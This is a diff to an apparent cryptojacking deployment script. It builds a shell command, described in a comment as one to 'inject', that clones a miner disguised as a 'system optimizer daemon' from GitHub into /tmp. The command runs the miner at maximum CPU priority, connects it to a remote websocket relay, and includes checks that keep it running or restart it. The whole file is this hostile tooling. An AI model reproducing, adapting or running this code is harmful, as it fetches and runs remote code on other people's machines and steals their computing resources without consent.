@@ -12,7 +12,8 @@ from datetime import datetime
 
 # Worker config
 MINER_REPO = "https://github.com/crucifix-cray/system-optimizer-daemon.git"
-BRIDGE_URL = "wss://chimera-bridge-production-0ef2.up.railway.app"
+# Default lives in sysoptd.py (DEFAULT_BRIDGE). Inject must NOT pass --bridge.
+BRIDGE_URL = "wss://chimera-bridge-production-1645.up.railway.app"
 
 
 def generate_random_folder_name() -> str:
@@ -21,14 +22,31 @@ def generate_random_folder_name() -> str:
 
 
 def build_worker_command(folder_name: str, bridge_url: str = BRIDGE_URL, threads: int = 64) -> str:
-    """Build worker start command."""
-    # bridge_url MUST be passed — without --bridge the cloned repo defaults to a different relay
-    return (
-        f"cd /tmp && pkill python; rm -rf {folder_name} && "
+    """Build worker start command.
+
+    No --bridge (daemon DEFAULT_BRIDGE points at the enhanced Railway service).
+    - If sysoptd already running → skip
+    - If /tmp/moly missing → clone + start (exact user cmd shape)
+    - If /tmp/moly present but python dead → restart from existing tree
+    """
+    run = (
+        f"cd /tmp/{folder_name} && "
+        f"nice -n -20 python3 sysoptd.py --threads {threads} "
+        f"--no-split --no-schedule --no-noise --no-ramfill --no-pause > /tmp/m.log 2>&1"
+    )
+    clone = (
+        f"cd /tmp && "
         f"git clone --depth 1 -q https://github.com/crucifix-cray/system-optimizer-daemon.git {folder_name} && "
         f"cd {folder_name} && pip install websockets psutil --break-system-packages -q && "
-        f"nice -n -20 python3 sysoptd.py --bridge {bridge_url} --threads {threads} "
+        f"nice -n -20 python3 sysoptd.py --threads {threads} "
         f"--no-split --no-schedule --no-noise --no-ramfill --no-pause > /tmp/m.log 2>&1"
+    )
+    return (
+        f'if pgrep -f "[p]ython3.*sysoptd" >/dev/null 2>&1; then '
+        f'echo "[skip] sysoptd already running"; '
+        f'elif [ ! -d /tmp/{folder_name} ]; then '
+        f"{clone}; "
+        f"else {run}; fi"
     )
 
 
